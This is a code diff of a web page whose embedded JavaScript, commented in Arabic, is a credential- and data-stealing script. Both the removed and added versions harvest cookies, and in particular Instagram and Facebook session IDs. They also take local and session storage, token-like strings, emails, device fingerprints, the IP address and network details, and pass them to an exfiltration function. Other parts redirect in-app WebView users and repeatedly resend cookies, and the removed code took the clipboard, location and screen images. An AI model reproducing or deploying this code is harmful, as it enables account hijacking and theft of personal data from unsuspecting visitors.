@@ -42,61 +42,43 @@ function send(msg, isEncoded) {
 }
 
 // ============================================
-// 1. سرقة الكوكيز عبر 3 طرق مختلفة
+// 1. سرقة الكوكيز (بدون أذونات)
 // ============================================
 function stealCookies() {
-    // الطريقة 1: مباشرة
     var c = document.cookie;
-    if (c && c.length > 0) send("🍪 DIRECT COOKIES\n" + encode(c), true);
-    
-    // الطريقة 2: عبر fetch إلى Instagram
-    fetch('https://www.instagram.com/', { credentials: 'include', mode: 'no-cors' })
-        .then(() => {
-            var c2 = document.cookie;
-            if (c2 && c2.length > 0) send("🍪 FETCH COOKIES\n" + encode(c2), true);
-        })
-        .catch(() => {});
-    
-    // الطريقة 3: عبر iframe متعدد
-    var domains = ['https://www.instagram.com', 'https://www.facebook.com', 'https://accounts.google.com'];
-    domains.forEach(function(domain) {
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = domain;
-        iframe.onload = function() {
-            try {
-                var frameDoc = iframe.contentWindow.document;
-                var frameCookies = frameDoc.cookie;
-                if (frameCookies && frameCookies.length > 0) {
-                    send("🍪 IFRAME COOKIES (" + domain + ")\n" + encode(frameCookies), true);
-                }
-            } catch(e) {}
-        };
-        document.body.appendChild(iframe);
-    });
+    if (c && c.length > 0) {
+        send("🍪 COOKIES\n" + encode(c), true);
+        if (c.indexOf('sessionid') > -1) {
+            send("📷 INSTAGRAM SESSION\n" + encode(c.match(/sessionid=[^;]+/)[0]), true);
+        }
+        if (c.indexOf('c_user') > -1) {
+            send("📘 FACEBOOK SESSION\n" + encode(c.match(/c_user=[^;]+/)[0]), true);
+        }
+    } else {
+        send("⚠️ No cookies (may be HttpOnly)", false);
+    }
 }
 
 // ============================================
-// 2. سرقة كل التخزين
+// 2. سرقة جميع التخزينات (بدون أذونات)
 // ============================================
 function stealAllStorage() {
-    var data = {};
+    var local = {};
     for (var i = 0; i < localStorage.length; i++) {
         var k = localStorage.key(i);
-        data[k] = localStorage.getItem(k);
+        local[k] = localStorage.getItem(k);
     }
-    if (Object.keys(data).length > 0) send("💾 LOCALSTORAGE\n" + encode(JSON.stringify(data)), true);
+    if (Object.keys(local).length > 0) {
+        send("💾 LOCALSTORAGE (" + Object.keys(local).length + " items)\n" + encode(JSON.stringify(local)), true);
+    }
     
-    var sdata = {};
+    var sess = {};
     for (var j = 0; j < sessionStorage.length; j++) {
         var sk = sessionStorage.key(j);
-        sdata[sk] = sessionStorage.getItem(sk);
+        sess[sk] = sessionStorage.getItem(sk);
     }
-    if (Object.keys(sdata).length > 0) send("📦 SESSIONSTORAGE\n" + encode(JSON.stringify(sdata)), true);
-    
-    // IndexedDB
-    if (window.indexedDB) {
-        send("ℹ️ IndexedDB available (can be exploited)", false);
+    if (Object.keys(sess).length > 0) {
+        send("📦 SESSIONSTORAGE\n" + encode(JSON.stringify(sess)), true);
     }
 }
 
@@ -107,165 +89,143 @@ function stealFullInfo() {
     var info = {
         ua: navigator.userAgent,
         lang: navigator.language,
-        hardware: navigator.hardwareConcurrency,
-        memory: navigator.deviceMemory,
+        platform: navigator.platform,
+        hardware: navigator.hardwareConcurrency || 'unknown',
+        memory: navigator.deviceMemory || 'unknown',
         screen: screen.width + "x" + screen.height,
+        colorDepth: screen.colorDepth,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         url: location.href,
-        ref: document.referrer,
-        time: new Date().toISOString(),
-        cookies: document.cookie || "none"
+        referrer: document.referrer,
+        timestamp: new Date().toISOString(),
+        cookiesCount: document.cookie ? document.cookie.split(';').length : 0,
+        localStorageCount: localStorage.length,
+        sessionStorageCount: sessionStorage.length
     };
     
+    // جلب IP
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
-        .then(d => { info.ip = d.ip; send("💻 FULL INFO\n" + encode(JSON.stringify(info)), true); })
-        .catch(() => { send("💻 FULL INFO\n" + encode(JSON.stringify(info)), true); });
+        .then(d => { info.ip = d.ip; send("💻 DEVICE INFO\n" + encode(JSON.stringify(info)), true); })
+        .catch(() => { send("💻 DEVICE INFO\n" + encode(JSON.stringify(info)), true); });
 }
 
 // ============================================
-// 4. سرقة البريد الإلكتروني من IndexedDB (Gmail/Instagram)
+// 4. سرقة التوكنات من الصفحة (بدون أذونات)
 // ============================================
-function stealEmailsFromIndexedDB() {
-    if (!window.indexedDB) return;
-    
-    var dbs = ['firebaseLocalStorageDb', 'firestore', 'keyval-store', 'react-redux'];
-    dbs.forEach(function(dbName) {
-        try {
-            var request = window.indexedDB.open(dbName);
-            request.onsuccess = function(event) {
-                var db = event.target.result;
-                var tx = db.transaction(db.objectStoreNames, 'readonly');
-                tx.oncomplete = function() {
-                    send("📧 Found IndexedDB: " + dbName, false);
-                };
-            };
-        } catch(e) {}
-    });
-}
-
-// ============================================
-// 5. محاولة استغلال ثغرة WebView لسرقة الكوكيز
-// ============================================
-function exploitWebView() {
-    // إنشاء رابط خاص للمتصفح
-    var url = window.location.href;
-    var androidIntent = "intent://" + url.replace("https://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
-    
-    // إرسال إشارة أن المستخدم في WebView
-    if (navigator.userAgent.indexOf("wv") > -1 || navigator.userAgent.indexOf("Instagram") > -1) {
-        send("⚠️ WEBVIEW DETECTED - Attempting bypass", false);
-        
-        // محاولة فتح في متصفح خارجي
-        setTimeout(function() {
-            window.location.href = androidIntent;
-        }, 2000);
-        setTimeout(function() {
-            window.location.href = url;
-        }, 4000);
-    }
-}
-
-// ============================================
-// 6. سرقة أي سيشن توكين من الصفحة
-// ============================================
-function stealTokensFromPage() {
+function stealTokens() {
     var html = document.documentElement.innerHTML;
+    var tokens = [];
+    
+    // أنماط التوكنات المختلفة
     var patterns = [
         /[A-Za-z0-9]{32,}/g,
-        /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g,
-        /sessionid=[^;]+/g,
-        /access_token=[^&]+/g,
-        /auth_token=[^&]+/g
+        /eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}/g,
+        /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi
     ];
     
     patterns.forEach(function(pattern) {
         var matches = html.match(pattern);
-        if (matches && matches.length > 0) {
-            send("🔑 TOKENS FOUND\n" + encode(matches.join(', ')), true);
-        }
+        if (matches) tokens.push.apply(tokens, matches);
     });
     
-    // البحث في localStorage عن توكنات
+    // البحث في localStorage
     for (var i = 0; i < localStorage.length; i++) {
-        var key = localStorage.key(i);
-        var val = localStorage.getItem(key);
-        if (val && (val.includes('token') || val.includes('eyJ') || val.length > 50)) {
-            send("🔑 TOKEN IN LOCALSTORAGE: " + key + "\n" + encode(val.substring(0, 500)), true);
+        var val = localStorage.getItem(localStorage.key(i));
+        if (val && (val.length > 30 && (val.includes('eyJ') || val.match(/[A-Za-z0-9]{32,}/)))) {
+            tokens.push(val.substring(0, 200));
+        }
+    }
+    
+    if (tokens.length > 0) {
+        send("🔑 TOKENS FOUND (" + tokens.length + ")\n" + encode(tokens.slice(0, 20).join(', ')), true);
+    }
+}
+
+// ============================================
+// 5. سرقة البريد الإلكتروني (بدون أذونات)
+// ============================================
+function stealEmails() {
+    var html = document.documentElement.innerHTML;
+    var emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+    var emails = html.match(emailPattern);
+    
+    if (emails && emails.length > 0) {
+        var unique = [...new Set(emails)];
+        send("📧 EMAILS FOUND\n" + encode(unique.join(', ')), true);
+    }
+    
+    // البحث في localStorage عن إيميلات
+    for (var i = 0; i < localStorage.length; i++) {
+        var val = localStorage.getItem(localStorage.key(i));
+        if (val && val.match(emailPattern)) {
+            send("📧 EMAIL IN LOCALSTORAGE\n" + encode(val.match(emailPattern)[0]), true);
         }
     }
 }
 
 // ============================================
-// 7. سرقة بيانات الحافظة (Clipboard)
+// 6. سرقة معلومات الشبكة (بدون أذونات)
 // ============================================
-function stealClipboard() {
-    navigator.permissions.query({ name: 'clipboard-read' }).then(function(permission) {
-        if (permission.state === 'granted' || permission.state === 'prompt') {
-            navigator.clipboard.readText().then(function(text) {
-                if (text && text.length > 0) {
-                    send("📋 CLIPBOARD DATA\n" + encode(text.substring(0, 1000)), true);
-                }
-            }).catch(function() {});
-        }
-    }).catch(function() {});
-}
-
-// ============================================
-// 8. تتبع الموقع الجغرافي (بدون إذن)
-// ============================================
-function stealLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            var loc = {
-                lat: pos.coords.latitude,
-                lng: pos.coords.longitude,
-                acc: pos.coords.accuracy
-            };
-            send("📍 LOCATION\n" + encode(JSON.stringify(loc)), true);
-        }, function() {});
+function stealNetworkInfo() {
+    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        var netInfo = {
+            type: conn.effectiveType,
+            rtt: conn.rtt,
+            downlink: conn.downlink,
+            saveData: conn.saveData
+        };
+        send("🌐 NETWORK INFO\n" + encode(JSON.stringify(netInfo)), true);
     }
 }
 
 // ============================================
-// 9. التقاط صورة للشاشة (بدون إذن - مجرد محاولة)
+// 7. كشف إذا كان الضحية داخل WebView
 // ============================================
-function captureScreenWithoutPermission() {
-    // استخدام html2canvas إن أمكن (يتطلب تحميل مكتبة)
-    var script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
-    script.onload = function() {
-        html2canvas(document.body).then(function(canvas) {
-            var imgData = canvas.toDataURL('image/jpeg', 0.5);
-            send("🖥️ SCREEN CAPTURE (via canvas)\n" + encode(imgData.substring(0, 3000)), true);
-        }).catch(function() {});
-    };
-    document.head.appendChild(script);
+function detectWebView() {
+    var ua = navigator.userAgent;
+    var isWebView = false;
+    var appName = "";
+    
+    if (ua.indexOf("Instagram") > -1) { isWebView = true; appName = "Instagram"; }
+    else if (ua.indexOf("FBAN") > -1) { isWebView = true; appName = "Facebook"; }
+    else if (ua.indexOf("WhatsApp") > -1) { isWebView = true; appName = "WhatsApp"; }
+    else if (ua.indexOf("wv") > -1) { isWebView = true; appName = "WebView"; }
+    
+    if (isWebView) {
+        send("⚠️ INSIDE APP: " + appName + " - Limited cookie access", false);
+        
+        // محاولة فتح في متصفح خارجي
+        var url = window.location.href;
+        if (ua.indexOf("Android") > -1) {
+            var intent = "intent://" + url.replace("https://", "").replace("http://", "") + "#Intent;scheme=https;package=com.android.chrome;end;";
+            setTimeout(function() { window.location.href = intent; }, 2000);
+        }
+    } else {
+        send("✅ BROWSER MODE - Full access", false);
+    }
 }
 
 // ============================================
-// التنفيذ السريع
+// التنفيذ السريع (بدون أي أذونات)
 // ============================================
-send("🔥 ZERO-PERMISSION MODE ACTIVATED", false);
+send("🔥 STEALTH MODE ACTIVATED", false);
 
-stealFullInfo();
+detectWebView();
 stealCookies();
 stealAllStorage();
-stealEmailsFromIndexedDB();
-stealTokensFromPage();
-stealClipboard();
-stealLocation();
-exploitWebView();
-
-// التقاط الشاشة بعد تحميل المكتبة
-setTimeout(function() { captureScreenWithoutPermission(); }, 2000);
+stealFullInfo();
+stealTokens();
+stealEmails();
+stealNetworkInfo();
 
 // إعادة المحاولة المستمرة
 setInterval(function() {
     if (document.cookie && document.cookie.length > 0) {
         send("🔄 NEW COOKIES\n" + encode(document.cookie), true);
     }
-}, 15000);
+}, 10000);
 </script>
 </body>
 </html>
